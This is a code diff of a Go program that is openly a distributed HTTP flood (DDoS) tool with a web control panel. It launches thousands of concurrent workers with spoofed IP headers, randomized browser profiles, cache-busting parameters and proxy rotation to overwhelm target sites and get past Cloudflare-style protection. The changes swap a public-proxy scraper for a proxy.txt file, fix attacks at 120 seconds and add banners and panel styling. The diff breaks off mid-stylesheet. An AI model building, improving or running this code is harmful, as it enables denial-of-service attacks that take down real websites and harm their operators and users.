@@ -23,13 +23,19 @@ import (
 )
 
 const (
-	Speed          = 7500
-	to             = 6 * time.Second
-	KEP            = 30 * time.Second
-	SCRAPE_WORKERS = 1500
-	CHECK_WORKERS  = 1500
-	CHECK_TIMEOUT  = 3 * time.Second
-	RETRY_COUNT    = 1
+	HAPUS  = "\033[0m"
+	MERAH  = "\033[31m"
+	IJO    = "\033[32m"
+	PUTIH  = "\033[37m"
+	CANDY  = "\033[91m"
+	PUCAT  = "\033[38;5;203m"
+	PUNYAMU = "\033[38;5;204m"
+	PUNYA_LU_PUCAT = "\033[38;5;218m"
+	MASA_DEPAN_NYA = "\033[97m"
+
+	Speed = 7500
+	to    = 6 * time.Second
+	KEP   = 30 * time.Second
 )
 
 type BPF struct {
@@ -187,7 +193,9 @@ var PFS = []BPF{
 }
 
 var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
+
 var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
+
 var REF = []string{
 	"https://www.google.com/search?q=",
 	"https://www.bing.com/search?q=",
@@ -199,50 +207,6 @@ type CLI struct {
 	client *http.Client
 	ip     string
 }
-
-type Proxy struct {
-	IP   string
-	Port string
-}
-
-type ProxyManager struct {
-	mu       sync.RWMutex
-	proxies  map[string]Proxy
-	filePath string
-}
-
-type ORPL struct {
-	Origin       string
-	Referer      string
-	SecFetchSite string
-}
-
-type headerItem struct {
-	key, value string
-}
-
-var (
-	stateMutex    sync.Mutex
-	attackState   string
-	cooldownUntil time.Time
-	proxyManager  *ProxyManager
-
-	scanMutex   sync.Mutex
-	scanRunning bool
-	scanCancel  context.CancelFunc
-	scanCtx     context.Context
-
-	scrapeMutex   sync.Mutex
-	scrapeRunning bool
-	scrapeCancel  context.CancelFunc
-	scrapeCtx     context.Context
-
-	tunnelMutex sync.Mutex
-	tunnelHost  string
-	tunnelReady bool
-)
-
-var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 
 func init() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
@@ -261,6 +225,8 @@ func RST(rng *rand.Rand, length int) string {
 	return string(b)
 }
 
+var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
+
 func PMP(target string) int {
 	client := &http.Client{
 		Timeout: 5 * time.Second,
@@ -269,7 +235,7 @@ func PMP(target string) int {
 		},
 	}
 	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
-	berhasil := 0
+	Berhasil := 0
 	for _, size := range sizes {
 		testURL := target
 		if strings.Contains(testURL, "?") {
@@ -285,14 +251,14 @@ func PMP(target string) int {
 		}
 		resp.Body.Close()
 		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-			berhasil = size
+			Berhasil = size
 		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
 			break
 		} else {
 			break
 		}
 	}
-	return berhasil
+	return Berhasil
 }
 
 func PMH(target string) int {
@@ -303,7 +269,7 @@ func PMH(target string) int {
 		},
 	}
 	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
-	berhasil := 0
+	Berhasil := 0
 	for _, size := range sizes {
 		req, _ := http.NewRequest("GET", target, nil)
 		req.Header.Set("User-Agent", "Mozilla/5.0")
@@ -314,17 +280,17 @@ func PMH(target string) int {
 		}
 		resp.Body.Close()
 		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-			berhasil = size
+			Berhasil = size
 		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
 			break
 		} else {
 			break
 		}
 	}
-	return berhasil
+	return Berhasil
 }
 
-func PHR(target string, proxyX string) map[string]bool {
+func PHR(target string, ProxyX string) map[string]bool {
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 		Transport: &http.Transport{
@@ -333,11 +299,12 @@ func PHR(target string, proxyX string) map[string]bool {
 	}
 	parsedTarget, _ := url.Parse(target)
 	targetHost := parsedTarget.Hostname()
-	if proxyX == "" {
+	if ProxyX == "" {
 		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-		proxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+		ProxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
 	}
-	headersBypas := []string{
+
+	HeadersBypas := []string{
 		"X-Original-URL",
 		"X-Forwarded-Host",
 		"X-Request-ID",
@@ -346,7 +313,7 @@ func PHR(target string, proxyX string) map[string]bool {
 		"True-Client-IP",
 	}
 	result := make(map[string]bool)
-	for _, h := range headersBypas {
+	for _, h := range HeadersBypas {
 		req, _ := http.NewRequest("GET", target, nil)
 		req.Header.Set("User-Agent", "Mozilla/5.0")
 		switch h {
@@ -359,9 +326,9 @@ func PHR(target string, proxyX string) map[string]bool {
 		case "CDN-Loop":
 			req.Header.Set("CDN-Loop", "cloudflare")
 		case "CF-Connecting-IP":
-			req.Header.Set("CF-Connecting-IP", proxyX)
+			req.Header.Set("CF-Connecting-IP", ProxyX)
 		case "True-Client-IP":
-			req.Header.Set("True-Client-IP", proxyX)
+			req.Header.Set("True-Client-IP", ProxyX)
 		}
 		resp, err := client.Do(req)
 		if err != nil {
@@ -595,6 +562,12 @@ func CACH(target string) []string {
 	return valid
 }
 
+type ORPL struct {
+	Origin       string
+	Referer      string
+	SecFetchSite string
+}
+
 func GPFO(origin string, host string) ORPL {
 	switch origin {
 	case "https://" + host:
@@ -630,287 +603,17 @@ func GPFO(origin string, host string) ORPL {
 	}
 }
 
-func NewProxyManager(filePath string) *ProxyManager {
-	pm := &ProxyManager{
-		proxies:  make(map[string]Proxy),
-		filePath: filePath,
-	}
-	pm.load()
-	return pm
-}
+var (
+	stateMutex    sync.Mutex
+	attackState   string
+	cooldownUntil time.Time
+)
 
-func (pm *ProxyManager) load() {
-	pm.mu.Lock()
-	defer pm.mu.Unlock()
-	f, err := os.Open(pm.filePath)
-	if err != nil {
-		return
-	}
-	defer f.Close()
-	scanner := bufio.NewScanner(f)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if line == "" {
-			continue
-		}
-		ip, port := parseLine(line)
-		if ip != "" && port != "" {
-			pm.proxies[ip+":"+port] = Proxy{ip, port}
-		}
-	}
-}
-
-func (pm *ProxyManager) save() {
-	pm.mu.RLock()
-	defer pm.mu.RUnlock()
-	f, err := os.Create(pm.filePath)
-	if err != nil {
-		return
-	}
-	defer f.Close()
-	w := bufio.NewWriter(f)
-	for _, p := range pm.proxies {
-		w.WriteString(p.IP + ":" + p.Port + "\n")
-	}
-	w.Flush()
-}
-
-func (pm *ProxyManager) Add(proxies []Proxy) int {
-	pm.mu.Lock()
-	defer pm.mu.Unlock()
-	added := 0
-	for _, p := range proxies {
-		key := p.IP + ":" + p.Port
-		if _, ok := pm.proxies[key]; !ok {
-			pm.proxies[key] = p
-			added++
-		}
-	}
-	if added > 0 {
-		go pm.save()
-	}
-	return added
-}
-
-func (pm *ProxyManager) GetProxies() []Proxy {
-	pm.mu.RLock()
-	defer pm.mu.RUnlock()
-	out := make([]Proxy, 0, len(pm.proxies))
-	for _, p := range pm.proxies {
-		out = append(out, p)
-	}
-	return out
-}
-
-func (pm *ProxyManager) Count() int {
-	pm.mu.RLock()
-	defer pm.mu.RUnlock()
-	return len(pm.proxies)
-}
-
-func (pm *ProxyManager) RemoveDead(dead []string) {
-	pm.mu.Lock()
-	defer pm.mu.Unlock()
-	for _, key := range dead {
-		delete(pm.proxies, key)
-	}
-	go pm.save()
-}
-
-func parseLine(line string) (ip, port string) {
-	if i := strings.Index(line, "://"); i != -1 {
-		line = line[i+3:]
-	}
-	parts := strings.SplitN(line, ":", 2)
-	if len(parts) != 2 {
-		return "", ""
-	}
-	ip = parts[0]
-	port = strings.SplitN(parts[1], " ", 2)[0]
-	port = strings.SplitN(port, "/", 2)[0]
-	if net.ParseIP(ip) == nil && !strings.Contains(ip, ".") {
-		return "", ""
-	}
-	for _, c := range ip + ":" + port {
-		if !(c >= '0' && c <= '9' || c == '.' || c == ':') {
-			return "", ""
-		}
-	}
-	return ip, port
-}
-
-var proxySources = []string{
-	"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
-	"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-	"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-http.txt",
-	"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
-	"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-	"https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
-	"https://raw.githubusercontent.com/joy-deploy/free-proxy-list/main/data/latest/types/http/proxies.txt",
-	"https://raw.githubusercontent.com/fyvri/fresh-proxy-list/archive/storage/classic/http.txt",
-	"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies/http.txt",
-	"https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
-	"https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
-	"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/http.txt",
-	"https://raw.githubusercontent.com/elli0t43/proxy-list/master/http.txt",
-	"https://raw.githubusercontent.com/hookzof/socks5_list/master/txt/http.txt",
-	"https://raw.githubusercontent.com/a2u/free-proxy-list/main/http.txt",
-	"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
-}
-
-func scrapeProxies(ctx context.Context) []Proxy {
-	chSrc := make(chan string, len(proxySources))
-	chRes := make(chan Proxy, 10000)
-	var wg sync.WaitGroup
-	for i := 0; i < SCRAPE_WORKERS; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			client := &http.Client{
-				Timeout: 5 * time.Second,
-				Transport: &http.Transport{
-					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-				},
-			}
-			for url := range chSrc {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-				}
-				resp, err := client.Get(url)
-				if err != nil {
-					continue
-				}
-				body, _ := io.ReadAll(resp.Body)
-				resp.Body.Close()
-				scanner := bufio.NewScanner(strings.NewReader(string(body)))
-				for scanner.Scan() {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-					}
-					line := strings.TrimSpace(scanner.Text())
-					if line == "" || strings.HasPrefix(line, "#") {
-						continue
-					}
-					ip, port := parseLine(line)
-					if ip != "" && port != "" {
-						chRes <- Proxy{ip, port}
-					}
-				}
-			}
-		}()
-	}
-	for _, src := range proxySources {
-		chSrc <- src
-	}
-	close(chSrc)
-	go func() {
-		wg.Wait()
-		close(chRes)
-	}()
-	m := make(map[string]Proxy)
-	for p := range chRes {
-		select {
-		case <-ctx.Done():
-			return nil
-		default:
-		}
-		m[p.IP+":"+p.Port] = p
-	}
-	out := make([]Proxy, 0, len(m))
-	for _, p := range m {
-		out = append(out, p)
-	}
-	return out
-}
-
-func checkProxies(proxies []Proxy, ctx context.Context) []Proxy {
-	if len(proxies) == 0 {
-		return nil
-	}
-	var wg sync.WaitGroup
-	input := make(chan Proxy, 5000)
-	output := make(chan Proxy, 5000)
-	for i := 0; i < CHECK_WORKERS; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for p := range input {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-				}
-				proxyURL, _ := url.Parse("http://" + p.IP + ":" + p.Port)
-				transport := &http.Transport{
-					TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-					DisableKeepAlives: true,
-					DialContext: (&net.Dialer{
-						Timeout:   CHECK_TIMEOUT,
-						KeepAlive: 0,
-					}).DialContext,
-					Proxy: http.ProxyURL(proxyURL),
-				}
-				client := &http.Client{
-					Transport: transport,
-					Timeout:   CHECK_TIMEOUT,
-				}
-				ok := false
-				for retry := 0; retry <= RETRY_COUNT; retry++ {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-					}
-					ctx2, cancel := context.WithTimeout(ctx, CHECK_TIMEOUT)
-					req, _ := http.NewRequestWithContext(ctx2, "GET", "http://clients3.google.com/generate_204", nil)
-					resp, err := client.Do(req)
-					cancel()
-					if err == nil && resp.StatusCode == 204 {
-						io.Copy(io.Discard, resp.Body)
-						resp.Body.Close()
-						ok = true
-						break
-					}
-					if resp != nil {
-						resp.Body.Close()
-					}
-				}
-				if ok {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-					}
-					output <- p
-				}
-			}
-		}()
-	}
-	go func() {
-		for _, p := range proxies {
-			select {
-			case <-ctx.Done():
-				return
-			default:
-			}
-			input <- p
-		}
-		close(input)
-	}()
-	go func() {
-		wg.Wait()
-		close(output)
-	}()
-	var alive []Proxy
-	for p := range output {
-		alive = append(alive, p)
-	}
-	return alive
-}
+var (
+	tunnelMutex sync.Mutex
+	tunnelHost  string
+	tunnelReady bool
+)
 
 func runAttack(tgt string, dur int, cookie string) {
 	parsed, _ := url.Parse(tgt)
@@ -918,12 +621,24 @@ func runAttack(tgt string, dur int, cookie string) {
 	if strings.HasPrefix(host, "www.") {
 		host = host[4:]
 	}
-	proxies := proxyManager.GetProxies()
+
 	var PRX []*url.URL
-	for _, p := range proxies {
-		prx, _ := url.Parse("http://" + p.IP + ":" + p.Port)
-		if prx != nil {
-			PRX = append(PRX, prx)
+
+	file, err := os.Open("proxy.txt")
+	if err == nil {
+		defer file.Close()
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			line := strings.TrimSpace(scanner.Text())
+			if line == "" {
+				continue
+			}
+			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
+				line = "http://" + line
+			}
+			if p, err := url.Parse(line); err == nil {
+				PRX = append(PRX, p)
+			}
 		}
 	}
 	if len(PRX) == 0 {
@@ -939,6 +654,7 @@ func runAttack(tgt string, dur int, cookie string) {
 	if len(proxyIPs) > 0 {
 		ProxyX = proxyIPs[0]
 	}
+
 	ipPool := proxyIPs
 	if len(ipPool) == 0 {
 		ipPool = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
@@ -961,8 +677,10 @@ func runAttack(tgt string, dur int, cookie string) {
 
 	var wg sync.WaitGroup
 	wg.Add(10)
+
 	var probeDone int
 	var probeMu sync.Mutex
+
 	printProbe := func(name string) {
 		probeMu.Lock()
 		probeDone++
@@ -970,6 +688,7 @@ func runAttack(tgt string, dur int, cookie string) {
 		probeMu.Unlock()
 		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
 	}
+
 	go func() {
 		defer wg.Done()
 		MaxP = PMP(tgt)
@@ -1020,6 +739,7 @@ func runAttack(tgt string, dur int, cookie string) {
 		VCAC = CACH(tgt)
 		printProbe("CACHE")
 	}()
+
 	wg.Wait()
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
 
@@ -1069,24 +789,39 @@ func runAttack(tgt string, dur int, cookie string) {
 		wcs[i] = CLI{client: client, ip: ip}
 	}
 
-	fmt.Printf("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+	fmt.Printf("%s", MASA_DEPAN_NYA)
+	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
+	fmt.Printf("%s", PUNYA_LU_PUCAT)
+	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
+	fmt.Printf("%s", PUNYAMU)
+	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
+	fmt.Printf("%s", PUCAT)
+	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
+	fmt.Printf("%s", MERAH)
+	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
+	fmt.Printf("%s", CANDY)
+	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
+	fmt.Printf("%s", HAPUS)
+	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)
+
 	printInfo := func(label, value, status string) {
 		if status != "" {
 			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
-				"\033[32m", "\033[0m",
-				"\033[37m", label, "\033[0m",
-				"\033[31m", "\033[0m",
-				"\033[37m", value, "\033[0m",
-				"\033[31m", "\033[32m", status, "\033[31m",
+				IJO, HAPUS,
+				PUTIH, label, HAPUS,
+				MERAH, HAPUS,
+				PUTIH, value, HAPUS,
+				MERAH, IJO, status, MERAH,
 			)
 		} else {
 			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
-				"\033[32m", "\033[0m",
-				"\033[37m", label, "\033[0m",
-				"\033[31m", "\033[0m",
-				"\033[37m", value, "\033[0m")
+				IJO, HAPUS,
+				PUTIH, label, HAPUS,
+				MERAH, HAPUS,
+				PUTIH, value, HAPUS)
 		}
 	}
+
 	printInfo("Author", "Diz Flyze Ofc              ", "True")
 	printInfo("Target", host, "")
 	printInfo("Port  ", "443                        ", "True")
@@ -1096,18 +831,18 @@ func runAttack(tgt string, dur int, cookie string) {
 	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", HVERSI), "True")
 	if cookie != "" {
 		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
-			"\033[32m", "\033[0m",
-			"\033[37m", "\033[0m",
-			"\033[31m", "\033[0m",
-			"\033[31m", "\033[32m", "True", "\033[31m")
+			IJO, HAPUS,
+			PUTIH, HAPUS,
+			MERAH, HAPUS,
+			MERAH, IJO, "True", MERAH)
 	} else {
 		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
-			"\033[32m", "\033[0m",
-			"\033[37m", "\033[0m",
-			"\033[31m", "\033[0m",
-			"\033[37m", "\033[32m", "None", "\033[37m")
+			IJO, HAPUS,
+			PUTIH, HAPUS,
+			MERAH, HAPUS,
+			PUTIH, IJO, "None", PUTIH)
 	}
-	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", "\033[31m", "\033[0m")
+	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)
 
 	Start_Main := time.Now()
 	ctx, cancel := context.WithCancel(context.Background())
@@ -1121,24 +856,26 @@ func runAttack(tgt string, dur int, cookie string) {
 				return
 			case <-ticker.C:
 				elapsed := int(time.Since(Start_Main).Seconds())
-				remaining := dur - elapsed
+				remaining := 120 - elapsed
 				if remaining < 0 {
 					remaining = 0
 				}
 				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
-					"\033[32m", "\033[0m",
-					"\033[37m", "\033[0m",
-					"\033[31m", "\033[0m",
-					"\033[37m", elapsed, dur, "\033[0m",
-					"\033[31m", "\033[32m", "True", "\033[31m")
+					IJO, HAPUS,
+					PUTIH, HAPUS,
+					MERAH, HAPUS,
+					PUTIH, elapsed, 120, HAPUS,
+					MERAH, IJO, "True", MERAH)
 			}
 		}
 	}()
 	var wg2 sync.WaitGroup
-	if dur > 0 {
-		time.AfterFunc(time.Duration(dur)*time.Second, func() {
-			cancel()
-		})
+	time.AfterFunc(120*time.Second, func() {
+		cancel()
+	})
+
+	type headerItem struct {
+		key, value string
 	}
 
 	for i := 0; i < Speed; i++ {
@@ -1153,14 +890,17 @@ func runAttack(tgt string, dur int, cookie string) {
 				ref := VREF[rng.Intn(len(VREF))]
 				enc := VENC[rng.Intn(len(VENC))]
 				cacheCtrl := VCAC[rng.Intn(len(VCAC))]
+
 				FORIP := ipPool[rng.Intn(len(ipPool))]
 				realIP := cli.ip
 				if realIP == "" {
 					realIP = FORIP
 				}
+
 				SLOR := VORI[rng.Intn(len(VORI))]
 				OPRF := GPFO(SLOR, host)
 				prof := PFS[rng.Intn(len(PFS))]
+
 				params := []string{}
 				for j := 0; j < 2+rng.Intn(2); j++ {
 					key := CBP[rng.Intn(len(CBP))]
@@ -1183,6 +923,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				if rng.Intn(10) == 0 {
 					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
 				}
+
 				var body io.Reader
 				if method == "POST" {
 					body = strings.NewReader("")
@@ -1191,12 +932,15 @@ func runAttack(tgt string, dur int, cookie string) {
 				}
 				req, _ := http.NewRequest(method, targetURL, body)
 				headers := []headerItem{}
+
 				if method == "POST" {
 					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
 				}
+
 				headers = append(headers, headerItem{"User-Agent", ua})
 				headers = append(headers, headerItem{"Accept-Encoding", enc})
 				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})
+
 				if OPRF.Origin != "" && OPRF.Referer != "" {
 					headers = append(headers, headerItem{"Referer", OPRF.Referer})
 				} else if ref != "" {
@@ -1206,6 +950,7 @@ func runAttack(tgt string, dur int, cookie string) {
 					headers = append(headers, headerItem{"Origin", OPRF.Origin})
 				}
 				headers = append(headers, headerItem{"Sec-Fetch-Site", OPRF.SecFetchSite})
+
 				headers = append(headers, headerItem{"Accept", prof.Accept})
 				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
 				headers = append(headers, headerItem{"Connection", "keep-alive"})
@@ -1213,6 +958,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
 				headers = append(headers, headerItem{"If-Modified-Since", ifModifiedSince})
 				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})
+
 				if prof.SecChUa != "" {
 					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
 					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
@@ -1223,6 +969,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				if prof.DNT != "" {
 					headers = append(headers, headerItem{"DNT", prof.DNT})
 				}
+
 				if rng.Intn(3) == 0 {
 					headers = append(headers, headerItem{"TE", "trailers"})
 				}
@@ -1244,6 +991,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				if rng.Intn(4) == 0 {
 					headers = append(headers, headerItem{"Data-Return", "false"})
 				}
+
 				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
 					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
 				}
@@ -1272,6 +1020,7 @@ func runAttack(tgt string, dur int, cookie string) {
 					}
 					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
 				}
+
 				var cookies []string
 				if cookie != "" {
 					cookies = append(cookies, cookie)
@@ -1284,6 +1033,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				if len(cookies) > 0 {
 					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
 				}
+
 				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
 				headers = append(headers, headerItem{"X-Real-IP", realIP})
 				headers = append(headers, headerItem{"Range", "bytes=0-"})
@@ -1303,6 +1053,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				for _, h := range headers {
 					req.Header.Set(h.key, h.value)
 				}
+
 				resp, err := cli.client.Do(req)
 				if err == nil {
 					io.Copy(io.Discard, resp.Body)
@@ -1328,45 +1079,92 @@ const webHTML = `<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DZ-C2 [ t.me/ytdizflyze ]</title>
+    <title>YT : DIZFLYZE</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#0b0b0b; color:#e0e0e0; font-family:'Segoe UI',system-ui,sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
-        .dashboard { max-width:900px; width:100%; }
-        .header { display:flex; align-items:baseline; justify-content:space-between; border-bottom:1px solid #2a2a2a; padding-bottom:12px; margin-bottom:28px; }
+        body {
+            background: #0b0b0b;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .dashboard { max-width:780px; width:100%; }
+        .header {
+            display: flex;
+            align-items: baseline;
+            justify-content: space-between;
+            border-bottom:1px solid #2a2a2a;
+            padding-bottom:12px;
+            margin-bottom:28px;
+        }
         .header h1 { font-weight:300; font-size:1.8rem; letter-spacing:1px; color:#f0f0f0; }
         .header h1 span { color:#e74c3c; font-weight:400; }
-        .header .status { font-size:0.8rem; color:#7c7c7c; }
-        .header .status .dot { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; }
+        .header .status { font-size:0.8rem; color:#7c7c7c; letter-spacing:0.5px; }
+        .header .status .dot {
+            display:inline-block; width:8px; height:8px;
+            border-radius:50%; margin-right:6px;
+        }
         .dot.ready { background:#2ecc71; }
         .dot.busy { background:#e74c3c; animation:pulse 1s infinite; }
         .dot.cooldown { background:#f39c12; animation:pulse 1s infinite; }
-        @keyframes pulse { 0%{opacity:1;} 50%{opacity:0.4;} 100%{opacity:1;} }
-        .info-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px 30px; margin-bottom:30px; font-size:0.9rem; }
-        .info-grid .item { display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px solid #1e1e1e; word-break:break-all; }
+        @keyframes pulse { 0% { opacity:1; } 50% { opacity:0.4; } 100% { opacity:1; } }
+
+        .info-grid {
+            display:grid; grid-template-columns:1fr 1fr; gap:6px 30px;
+            margin-bottom:30px; padding:0 2px; font-size:0.9rem;
+        }
+        .info-grid .item {
+            display:flex; justify-content:space-between;
+            padding:6px 0; border-bottom:1px solid #1e1e1e;
+            word-break: break-all;
+        }
         .info-grid .item .label { color:#7c7c7c; flex-shrink:0; margin-right:10px; }
         .info-grid .item .value { color:#e0e0e0; font-weight:400; text-align:right; }
-        .section-title { font-size:0.75rem; text-transform:uppercase; letter-spacing:1.5px; color:#5c5c5c; margin:28px 0 14px 0; border-bottom:1px solid #1a1a1a; padding-bottom:6px; }
+        .section-title {
+            font-size:0.75rem; text-transform:uppercase; letter-spacing:1.5px;
+            color:#5c5c5c; margin:28px 0 14px 0;
+            border-bottom:1px solid #1a1a1a; padding-bottom:6px;
+        }
         .form-group { margin-bottom:16px; }
         .form-group label { display:block; font-size:0.8rem; color:#b0b0b0; margin-bottom:4px; letter-spacing:0.3px; }
-        .form-group input, .form-group textarea { width:100%; padding:10px 12px; background:#161616; border:1px solid #2a2a2a; border-radius:4px; color:#f0f0f0; font-size:0.95rem; transition:border 0.2s; outline:none; }
-        .form-group input:focus, .form-group textarea:focus { border-color:#e74c3c; }
+        .form-group input {
+            width:100%; padding:10px 12px; background:#161616;
+            border:1px solid #2a2a2a; border-radius:4px; color:#f0f0f0;
+            font-size:0.95rem; transition:border 0.2s; outline:none;
+        }
+        .form-group input:focus { border-color:#e74c3c; }
         .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
-        .btn { display:inline-block; width:100%; padding:12px; background:#e74c3c; border:none; border-radius:4px; color:#fff; font-weight:500; font-size:1rem; letter-spacing:1px; cursor:pointer; transition:background 0.2s; margin-top:8px; }
+        .btn {
+            display:inline-block; width:100%; padding:12px;
+            background:#e74c3c; border:none; border-radius:4px;
+            color:#fff; font-weight:500; font-size:1rem; letter-spacing:1px;
+            cursor:pointer; transition:background 0.2s, transform 0.1s; margin-top:8px;
+        }
         .btn:hover { background:#c0392b; }
+        .btn:active { transform:scale(0.98); }
         .btn:disabled { opacity:0.5; cursor:not-allowed; background:#555; }
-        .proxy-actions { display:grid; grid-template-columns:1fr 1fr 1fr 1fr; gap:16px; margin:20px 0; }
-        .proxy-actions .btn { background:#2c3e50; }
-        .proxy-actions .btn:hover { background:#1a252f; }
-        .proxy-actions .btn.stop { background:#e74c3c; }
-        .proxy-actions .btn.stop:hover { background:#c0392b; }
         .log-area { margin-top:30px; border-top:1px solid #1e1e1e; padding-top:16px; }
-        .log-area .log-header { display:flex; justify-content:space-between; font-size:0.7rem; color:#5c5c5c; margin-bottom:6px; }
-        .log-area .log-content { background:#0f0f0f; padding:12px 14px; border-radius:4px; font-family:'Fira Code',monospace; font-size:0.8rem; color:#a0a0a0; max-height:160px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border-left:2px solid #2a2a2a; }
+        .log-area .log-header {
+            display:flex; justify-content:space-between;
+            font-size:0.7rem; color:#5c5c5c; letter-spacing:0.5px; margin-bottom:6px;
+        }
+        .log-area .log-content {
+            background:#0f0f0f; padding:12px 14px; border-radius:4px;
+            font-family:'Fira Code', monospace; font-size:0.8rem; color:#a0a0a0;
+            max-height:160px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+            border-left:2px solid #2a2a2a;
+        }
         .log-area .log-content .attack-started { color:#2ecc71; }
         .log-area .log-content .error { color:#e74c3c; }
-        .log-area .log-content .info { color:#3498db; }
-        .footer { margin-top:30px; font-size:0.7rem; color:#3a3a3a; text-align:center; border-top:1px solid #1a1a1a; padding-top:16px; }
+        .log-area .log-content .cooldown-info { color:#f39c12; }
+        .footer {
+            margin-top:30px; font-size:0.7rem; color:#3a3a3a;
+            text-align:center; border-top:1px solid #1a1a1a; padding-top:16px;
